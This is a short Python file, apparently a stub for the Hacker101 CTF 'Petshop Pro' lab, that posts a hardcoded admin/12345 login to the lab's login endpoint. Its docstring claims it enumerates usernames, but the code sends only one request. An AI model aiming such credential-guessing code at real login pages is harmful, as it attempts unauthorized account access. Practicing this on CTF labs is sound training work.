"""
Hacker 101 CTF exercise "Petshop Pro" login cracker.
"""

import core.net.http as http
from core.conf.http import HttpRequest
from core.constants.http import Protocol, HttpMethod, ContentType, HeaderField

PROTOCOL = Protocol.HTTPS
ENDPOINT = "login"
USERNAME_FIELD = "username"
PASSWORD_FIELD = "password"
HEADERS = {
    HeaderField.CONTENT_TYPE.value: ContentType.FORM_URL.value[0],
    HeaderField.ACCEPT.value: ContentType.HTML.value[0]
}

UP = {USERNAME_FIELD: "admin", PASSWORD_FIELD: "12345"}


def crack_username(ip, instance_id):
    """
    Enumerates common usernames and returns the valid ones after trying.
    :param ip:
    :param instance_id:
    :return:
    """
    path = "/".join((instance_id, ENDPOINT))
    req = HttpRequest(method=HttpMethod.POST, host=ip, path=path, headers=HEADERS, body=UP)

    return http.send_one(req)
